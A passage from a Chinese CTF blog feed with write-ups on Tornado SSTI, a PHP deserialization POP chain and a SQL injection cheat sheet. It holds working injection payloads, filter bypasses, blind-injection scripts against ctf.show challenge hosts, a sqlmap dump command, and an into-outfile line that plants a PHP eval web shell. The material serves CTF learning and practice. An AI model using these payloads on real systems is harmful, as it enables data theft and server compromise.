plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到之后我们对&#x2F;fllllllllllllag文件进行<a href="https://www.sojson.com/md5/">md5在线加密</a></p><p>md5(cookie_secret+md5(filename))</p><p><strong>最终payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=/fllllllllllllag&amp;filehash=39482391ef4cc45a75262be45e94c725</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;护网杯-2018-easy-tornado&quot;&gt;&lt;a href=&quot;#护网杯-2018-easy-tornado&quot; class=&quot;headerlink&quot; title=&quot;[护网杯 2018]easy_tornado&quot;&gt;&lt;/a&gt;[护网杯 2018</summary>
      
    
    
    
    
    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
    
    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="tornado" scheme="http://1768161086.github,io/tags/tornado/"/>
    
  </entry>
  
  <entry>
    <title>反序列化</title>
    <link href="http://1768161086.github,io/2025/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://1768161086.github,io/2025/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-01-31T08:17:55.000Z</published>
    <updated>2025-03-13T11:18:26.319Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>反序列化相关知识点介绍</p></blockquote><h1 id="1-魔法方法"><a href="#1-魔法方法" class="headerlink" title="1.魔法方法"></a>1.魔法方法</h1><p>1.__sleep() &#x2F;&#x2F;执行serialize()时，先会调用这个函数<br>2.__wakeup() &#x2F;&#x2F;将在反序列化之后立即调用（当反序列化时变量个数与实际不符时绕过）<br>3.__construct() &#x2F;&#x2F;当对象被创建时，会触发进行初始化<br>4.__destruct() &#x2F;&#x2F;对象被销毁时触发<br>5.__toString()： &#x2F;&#x2F;当一个对象被当作字符串使用时触发<br>6.__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发<br>7.__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发<br>8.__get() &#x2F;&#x2F;获得一个类的成员变量时调用,用于从不可访问的属性读取数据（不可访问的属性包括：1.属性是私有型。2.类中不存在的成员变量）<br>9.__set() &#x2F;&#x2F;用于将数据写入不可访问的属性<br>10.__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发<br>11.__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发<br>12.__toString() &#x2F;&#x2F;把类当作字符串使用时触发<br>13.__invoke() &#x2F;&#x2F;当尝试以调用函数的方式调用一个对象时</p><p>private变量会被序列化为：\x00类名\x00变量名</p><p>protected变量会被序列化为: \x00*\x00变量名 </p><p>public变量会被序列化为：变量名</p><h1 id="2-相关过滤绕过"><a href="#2-相关过滤绕过" class="headerlink" title="2.相关过滤绕过"></a>2.相关过滤绕过</h1><p>1.过滤o:数字:与c:数字:这种情况是用+(加号)绕过的，如：o:+</p><h2 id="3-Basectf-Really-EZ-POP"><a href="#3-Basectf-Really-EZ-POP" class="headerlink" title="3.Basectf Really EZ POP"></a>3.Basectf Really EZ POP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &#x27;echo 123;&#x27;;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word = &#x27;Hello, World!&#x27;;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;Shark says:&#x27; . $this-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $sea_ani = $this-&gt;animal;</span><br><span class="line">        echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_POST[&#x27;nature&#x27;]) &#123;</span><br><span class="line">    $nature = unserialize($_POST[&#x27;nature&#x27;]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>pop链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sink::toString&lt;-Shark::invoke&lt;-Sea::get&lt;-Nature::destruct</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &quot;system(&#x27;ls&#x27;);&quot;;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word = &#x27;Hello, World!&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;Shark says:&#x27; . $this-&gt;word;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function setWord($newWord)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;word = $newWord;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $sea_ani = $this-&gt;animal;</span><br><span class="line">        echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Sink();</span><br><span class="line">$b = new Shark();</span><br><span class="line">$b-&gt;setWord($a); // 使用 setter 方法</span><br><span class="line">$c = new Sea();</span><br><span class="line">$c-&gt;animal = $b;</span><br><span class="line">$d = new Nature();</span><br><span class="line">$d-&gt;sea = $c;</span><br><span class="line">echo urlencode(serialize($d));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;反序列化相关知识点介绍&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;1-魔法方法&quot;&gt;&lt;a href=&quot;#1-魔法方法&quot; class=&quot;headerlink&quot; title=&quot;1.魔法方法&quot;&gt;&lt;/a&gt;1.魔法方法&lt;/h1&gt;&lt;p&gt;1.__slee</summary>
      
    
    
    
    
    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
    
    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="反序列化" scheme="http://1768161086.github,io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>sql注入</title>
    <link href="http://1768161086.github,io/2025/01/29/sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://1768161086.github,io/2025/01/29/sql%E6%B3%A8%E5%85%A5/</id>
    <published>2025-01-29T07:55:09.000Z</published>
    <updated>2025-03-13T11:58:19.578Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>sql注入相关命令介绍</p></blockquote><h1 id="1-sql相关查询命令"><a href="#1-sql相关查询命令" class="headerlink" title="1.sql相关查询命令"></a>1.sql相关查询命令</h1><p>1.查询字段数：</p><p>1’ order by 3#</p><p>2.查询数据库信息：</p><p>1’ union select user(),version(),database()#</p><p>3.获取表名</p><p>1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;’库名’</p><p>4.获取列名</p><p>1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’表名’</p><p>5.查 库:select schema_name from information_schema.schemata</p><p>6.查 表： select table_name from information_schema.tables where table_schema&#x3D;库名</p><p>7.查 列： select column_name from information_schema.columns where table_name&#x3D;表名</p><p>8.查数据： select 列名 from 库名.表名</p><p>（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 （2）version() 返回当前数据库的版本 </p><p>（2）version() 返回当前数据库的版本 </p><p>（3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 </p><p>（4）group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 </p><p>（5）@@datadir 数据库路径 </p><p>（6）@@version_compile_os 操作系统版本</p><h2 id="2-相关过滤绕过方法"><a href="#2-相关过滤绕过方法" class="headerlink" title="2.相关过滤绕过方法"></a>2.相关过滤绕过方法</h2><p>1.过滤数字0-9：</p><p>查询表名用字母替换0’ union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),’1’,’A’),’2’,’B’),’3’,’C’),’4’,’D’),’5’,’E’),’6’,’F’),’7’,’G’),’8’,’H’),’9’,’I’),’0’,’J’),’a’ from information_schema.tables where table_schema&#x3D;database()–+</p><p>最后得出flag用脚本还原替换：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">origin = &#x27;ctfshow&#123;eIdGcBcc-cACA-DEIF-aGcB-aAJGdJddGBCe&#125;&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">repl = &#123;</span><br><span class="line">        &#x27;A&#x27;: &#x27;1&#x27;,</span><br><span class="line">        &#x27;B&#x27;: &#x27;2&#x27;,</span><br><span class="line">        &#x27;C&#x27;: &#x27;3&#x27;,</span><br><span class="line">        &#x27;D&#x27;: &#x27;4&#x27;,</span><br><span class="line">        &#x27;E&#x27;: &#x27;5&#x27;,</span><br><span class="line">        &#x27;F&#x27;: &#x27;6&#x27;,</span><br><span class="line">        &#x27;G&#x27;: &#x27;7&#x27;,</span><br><span class="line">        &#x27;H&#x27;: &#x27;8&#x27;,</span><br><span class="line">        &#x27;I&#x27;: &#x27;9&#x27;,</span><br><span class="line">        &#x27;J&#x27;: &#x27;0&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">for k, v in repl.items():</span><br><span class="line">    origin = origin.replace(k, v)</span><br><span class="line">flag += origin</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>2.过滤ascii字母数字符号</p><p>-1’ union select 1,group_concat(password) from ctfshow_user5 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt’ –+，之后访问flag.txt或者用脚本</p><p>3.过滤空格</p><p>可用&#x2F;**&#x2F;、%09、%0a、%0b、%0c.、%0d、0’or(id&#x3D;26)and’1’&#x3D;’1、（）。</p><p>4.过滤#</p><p>可用%23。注释可用–+或#或–%0c或 – -。%23过滤：or’1’&#x3D;’  注释或– </p><p>5.&#x3D;号被过滤</p><p>可以用like来绕过。</p><p>6.substring与mid被过滤</p><p>可以用right与left来绕过</p><p>7.输出被限制的时候可以利用文件写入操作。如过滤掉了ascii从0到127的字符</p><p>-1’ union select  username,password from ctfshow_user5 into outfile “&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt”–+：使用into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;‘将信息输入到文件中去，然后访问对应文件</p><p>8.过滤 ‘ “ &#96;</p><p>可用roght join绕过：tableName&#x3D;<code>ctfshow_user</code> as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(46))</p><p>9.重命名字段</p><p>rename table <code>words</code> to words2; </p><p>10修改字段数据类型：</p><p>alter table words change flag id varchar(100);</p><p>11.union select被过滤</p><p>可双写绕过：ununionion seselectlect </p><p>12.万能密码：1’||1–%0c</p><p>13.like 结合 % 进行通配绕过</p><p>% 可以匹配任何数目的字符 ；_ 可以匹配单个字符</p><p>14.过滤order by,information_schema：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#x27;</span><br></pre></td></tr></table></figure><p>使用无列名注入查询字段信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure><h1 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h1><p>1.报错注入两个函数：</p><p>（1）updatexml(xml_target, xpath_expr, new_xml)第一个参数：是string格式，为XML文档对象的名称。第二个参数：代表路径，Xpath格式的字符串。第三个参数：string格式，替换查找到的符合条件的数据。第二个参数跟extractvalue函数的第二个参数一样，因此也可利用且利用方式相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure><p>（2）extractvalue(xml_frag, xpath_expr)接受两个字符串参数，一个XML标记片段xml_frag和一个XPath表达式xpath_expr（也称为定位器）；它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径。作用：从目标xml中返回包含所查询值的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,extractvalue(1,concat(&#x27;~&#x27;,(select database())))#</span><br></pre></td></tr></table></figure><p>2.区别：</p><p>^可来更换or,然后不用updatexml()，而是使用：extractvalue()原理都是一样的。</p><h1 id="4-handler用法"><a href="#4-handler用法" class="headerlink" title="4..handler用法"></a>4..handler用法</h1><p>在MySQL中，handler也可以执行查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">handler tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">handler tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">handler tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">handler tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">handler tbl_name CLOSE</span><br></pre></td></tr></table></figure><h1 id="5-写入shell文件"><a href="#5-写入shell文件" class="headerlink" title="5.写入shell文件"></a>5.写入shell文件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userid=a&#x27; union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/shell.php&quot;%23&amp;userpwd=1</span><br></pre></td></tr></table></figure><h1 id="6-sqlmap跑"><a href="#6-sqlmap跑" class="headerlink" title="6.sqlmap跑"></a>6.sqlmap跑</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://fddf2115-423b-4701-b77b-8ef5f2194ee7.challenge.ctf.show:8080/&quot; --form --batch --dump</span><br><span class="line"></span><br><span class="line"># 参数 </span><br><span class="line">--batch 批处理，在检测过程中会问用户一些问题，使用这个参数统统使用默认值</span><br><span class="line">--forms 在目标URL上解析和测试表单</span><br><span class="line">--dump 查询指定范围的全部数据</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web181-1-and-0-or-1满足两边的条件返回true"><a href="#web181-1-and-0-or-1满足两边的条件返回true" class="headerlink" title="web181:1 and 0 or 1满足两边的条件返回true"></a>web181:1 and 0 or 1满足两边的条件返回true</h2><p>username !&#x3D;’flag’ and id &#x3D; ‘“.$_GET[‘id’].”‘ limit 1;”;</p><p>payload:<code>-1&#39;||username=&#39;flag</code></p><h2 id="web183-select不能用，就只能选择布尔盲注或者时间盲注了。"><a href="#web183-select不能用，就只能选择布尔盲注或者时间盲注了。" class="headerlink" title="web183:select不能用，就只能选择布尔盲注或者时间盲注了。"></a>web183:select不能用，就只能选择布尔盲注或者时间盲注了。</h2><p>可以用布尔盲注：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tableName=`ctfshow_user`where`pass`like&#x27;ctfshow&#123;%&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=&quot;http://5b285b83-8642-4556-b1cc-ca435d196f99.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line"></span><br><span class="line">flagstr=&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(0,34):</span><br><span class="line">    for x in flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;tableName&quot;:&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;.format(flag+x)</span><br><span class="line">            #&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        #有并发数量限制的题目，就睡一段时间</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        if response.text.find(&quot;$user_count = 1;&quot;)&gt;0:</span><br><span class="line">            print(&quot;++++++++++++++++ &#123;&#125; is right&quot;.format(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">    print(&quot;ctfshow&quot;+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web184-where可以用having代替，单双引号可以用-括号-十六进制。"><a href="#web184-where可以用having代替，单双引号可以用-括号-十六进制。" class="headerlink" title="web184:where可以用having代替，单双引号可以用 括号+十六进制。"></a>web184:where可以用having代替，单双引号可以用 括号+十六进制。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=&quot;http://24873af7-39c6-4235-85e2-f6433b80f182.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line"></span><br><span class="line">flagstr=&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;   #40</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(0,40):</span><br><span class="line">    for x in flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;tableName&quot;:&quot;ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25&quot;.format(&quot;&quot;.join(hex(ord(i))[2:] for i in flag+x))</span><br><span class="line">        &#125;</span><br><span class="line">        #print(data)</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        #有并发数量限制的，就睡一段时间</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        if response.text.find(&quot;$user_count = 1;&quot;)&gt;0:</span><br><span class="line">            print(&quot;++++++++++++++++ &#123;&#125; is right&quot;.format(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">    print(&quot;ctfshow&#123;&quot;+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web185-数字、尖括号，-、-被过滤了，就要考虑如何构造纯字母的匹配。"><a href="#web185-数字、尖括号，-、-被过滤了，就要考虑如何构造纯字母的匹配。" class="headerlink" title="web185:数字、尖括号，^、%被过滤了，就要考虑如何构造纯字母的匹配。"></a>web185:数字、尖括号，<code>^</code>、<code>%</code>被过滤了，就要考虑如何构造纯字母的匹配。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def formatString(str):</span><br><span class="line">    temp=&quot;concat(&quot;</span><br><span class="line">    for x in str:</span><br><span class="line">        tip=0</span><br><span class="line">        if x in string.digits:</span><br><span class="line">            tmp=int(x)</span><br><span class="line">        else:</span><br><span class="line">            tip=1</span><br><span class="line">            temp+=&quot;char(&quot;</span><br><span class="line">            tmp=ord(x)</span><br><span class="line">        if tmp == 0:</span><br><span class="line">            temp+=&quot;false&quot;</span><br><span class="line">        else:</span><br><span class="line">            temp_d=&quot;(&quot;</span><br><span class="line">            for i in range(0,tmp):</span><br><span class="line">                temp_d+=&quot;true+&quot;</span><br><span class="line">            temp_d=temp_d[:-1]+&quot;)&quot;</span><br><span class="line">            if tip==1:</span><br><span class="line">                temp_d+=&quot;)&quot;</span><br><span class="line">            temp+=temp_d</span><br><span class="line">        temp+=&quot;,&quot;</span><br><span class="line">    temp=temp[:-1]+&quot;)&quot;</span><br><span class="line">    return temp</span><br><span class="line"></span><br><span class="line">#print(formatString(&quot;0x63746673686f777b&quot;))</span><br><span class="line"></span><br><span class="line">url=&quot;http://d2f644f5-968d-4301-b037-267c7b183b0e.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line">#dic的顺序可以改一下！我是懒得改了！改顺序可以提高效率！！！</span><br><span class="line">dic=&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span><br><span class="line">flag=&quot;ctfshow&#123;&quot;</span><br><span class="line">for i in range(0,40):</span><br><span class="line">    for x in dic:</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;tableName&quot;:&quot;ctfshow_user group by pass having pass regexp(&#123;&#125;)&quot;.format(formatString(flag+x))</span><br><span class="line">        &#125;</span><br><span class="line">        #print(data)</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        if response.text.find(&quot;$user_count = 1;&quot;)&gt;0:</span><br><span class="line">            print(&quot;[**] &#123;&#125; is right&quot;.format(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            #print(&quot;[--] &#123;&#125; is wrong&quot;.format(x))</span><br><span class="line">            continue</span><br><span class="line">    print(&quot;[flag]:&quot;+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web187-password-md5-POST-password-true"><a href="#web187-password-md5-POST-password-true" class="headerlink" title="web187.$password = md5($_POST[&#39;password&#39;],true);"></a>web187.<code>$password = md5($_POST[&#39;password&#39;],true);</code></h2><p>，将md5函数的第二参数设置为了true。</p><p><code>ffifdyop</code>是一个特殊的字符串，类似万能密码。还有129581926211651571912466741651878684928也可以达到同样的效果。sql语句就构成了<code>1 and 0 or 1</code>这样的操作</p><h2 id="Basectf-Sql-Inject-or-RCE"><a href="#Basectf-Sql-Inject-or-RCE" class="headerlink" 